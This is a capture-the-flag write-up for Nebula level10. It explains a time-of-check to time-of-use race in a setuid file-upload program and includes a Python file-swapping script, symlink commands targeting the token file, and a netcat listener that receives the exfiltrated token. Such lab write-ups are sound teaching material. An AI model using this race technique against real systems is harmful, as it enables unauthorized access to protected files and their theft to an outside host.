# Level10

This one is interesting. `vulnerable.c` is a file which has the setuid bit, and can upload any file you give it to a given host (with the right permissions). First, it checks that you have access to the file with the `access` syscall, then it connects to the host name, then it sends a banner along with the file. The key problem here is that it first *checks* the file, then *reads* later on. We can swap the file between the *check* and *read* such that the check is called on a valid file, but the read is called on an invalid file, and we gain access!

> This is called a Time-Of-Check To Time-Of-Use (TOCTOU) bug

```C
// BAD
if (access(argv[1], R_OK) == 0) 
// ...
ffd = open(file, O_RDONLY);
```

First, we can just create a simple python script as follows, which just switches two files around continuously:

```python
import os
import sys

f1, f2 = sys.argv[1:]

while True:
    os.rename(f1, 'temp')
    os.rename(f2, f1)
    os.rename('temp', f2)
```

Then, we create two files `good` and `bad`, where `bad` points to the `token` file. By swapping these two files around, hopefully we get an `access` on the `good` file, and a `read` on the `bad` file.

```bash
level10@nebula:/home/flag10$ ln -s /home/flag10/token ~/bad
level10@nebula:/home/flag10$ touch ~/good
level10@nebula:/home/flag10$ cd ~
level10@nebula:~$ python exploit.py good bad 
```

Then, we can listen for connections locally with netcat:

```bash
liamdalg@liamdalg-lp:~$ nc -lvp 18211
Listening on [0.0.0.0] (family 0, port 18211)
```

Finally, we run the `flag10` program a few times until the swap has happened just right, and get the token!

```bash
level10@nebula:/home/flag10$ ./flag10 ~/bad 192.168.0.180 
Connecting to 192.168.0.180:18211 .. Connected!
Sending file .. wrote file!
level10@nebula:/home/flag10$ ./flag10 ~/bad 192.168.0.180 
Connecting to 192.168.0.180:18211 .. Connected!
Sending file .. wrote file!
```

```bash
liamdalg@liamdalg-lp:~$ nc -lvp 18211
Listening on [0.0.0.0] (family 0, port 18211)
Connection from 192.168.0.184 45895 received!
.oO Oo.
liamdalg@liamdalg-lp:~$ nc -lvp 18211
Listening on [0.0.0.0] (family 0, port 18211)
Connection from 192.168.0.184 45895 received!
.oO Oo.
<TOKEN REDACTED>
```